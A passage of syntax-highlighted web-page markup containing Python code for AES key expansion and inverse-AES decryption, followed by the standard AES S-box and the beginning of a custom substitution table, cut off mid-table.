self<span class="token punctuation">.</span>Nk<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    temp2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp1 <span class="token operator">^</span> Rcon1<span class="token punctuation">)</span>                temp <span class="token operator">=</span> temp2            <span class="token keyword">elif</span> self<span class="token punctuation">.</span>Nk <span class="token operator">></span> <span class="token number">6</span> <span class="token keyword">and</span> i <span class="token operator">%</span> self<span class="token punctuation">.</span>Nk <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubWord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            w_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> w1<span class="token punctuation">,</span> temp1 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span>i <span class="token operator">-</span> self<span class="token punctuation">.</span>Nk<span class="token punctuation">]</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>                w_temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>w1 <span class="token operator">^</span> temp1<span class="token punctuation">)</span>            w<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> w_temp            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">return</span> w    <span class="token keyword">def</span> <span class="token function">IAES</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> IInput<span class="token punctuation">,</span> Cipher_Key<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        IInput <span class="token operator">=</span> <span class="token punctuation">[</span>IInput1 <span class="token keyword">for</span> IInput1 <span class="token keyword">in</span> IInput<span class="token punctuation">]</span>        Cipher_Key <span class="token operator">=</span> <span class="token punctuation">[</span>Cipher_Key1 <span class="token keyword">for</span> Cipher_Key1 <span class="token keyword">in</span> Cipher_Key<span class="token punctuation">]</span>        KeyExpansion <span class="token operator">=</span> self<span class="token punctuation">.</span>KeyExpansion<span class="token punctuation">(</span>Cipher_Key<span class="token punctuation">)</span>        keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> Key_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>KeyExpansion<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            keys_temp <span class="token operator">=</span> <span class="token punctuation">(</span>KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index<span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span>                <span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            keys_temp <span class="token operator">=</span> self<span class="token punctuation">.</span>arrays<span class="token punctuation">(</span>keys_temp<span class="token punctuation">)</span>            keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>keys_temp<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>arrays<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvShiftRows<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvSubBytes<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> index<span class="token punctuation">]</span><span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> index<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvMixColumns<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvShiftRows<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvSubBytes<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>Inv_arrays<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        <span class="token keyword">return</span> IInputS_box <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0xf2</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0xc5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0xfe</span><span class="token punctuation">,</span> <span class="token number">0xd7</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span>    <span class="token number">0xca</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xc9</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0xfa</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0xa2</span><span class="token punctuation">,</span> <span class="token number">0xaf</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0xa4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>    <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0xfd</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0xf1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xc7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9a</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xe2</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xb2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span>    <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0xb3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xe3</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xfc</span><span class="token punctuation">,</span> <span class="token number">0xb1</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span>    <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0xef</span><span class="token punctuation">,</span> <span class="token number">0xaa</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">,</span>    <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xf5</span><span class="token punctuation">,</span> <span class="token number">0xbc</span><span class="token punctuation">,</span> <span class="token number">0xb6</span><span class="token punctuation">,</span> <span class="token number">0xda</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xf3</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span>    <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token number">0x3d</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>    <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4f</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xee</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">,</span> <span class="token number">0xdb</span><span class="token punctuation">,</span>    <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3a</span><span class="token punctuation">,</span> <span class="token number">0x0a</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0xac</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span>    <span class="token number">0xe7</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6d</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0xd5</span><span class="token punctuation">,</span> <span class="token number">0x4e</span><span class="token punctuation">,</span> <span class="token number">0xa9</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span> <span class="token number">0xea</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>    <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2e</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0xdd</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0xbd</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span>    <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3e</span><span class="token punctuation">,</span> <span class="token number">0xb5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span>    <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x8e</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">,</span> <span class="token number">0xce</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xdf</span><span class="token punctuation">,</span>    <span class="token number">0x8c</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xbb</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">]</span>new_s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>             <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span>             <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>             <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span>             <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>             <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span>             <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span>             <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span>             <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span>             <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token 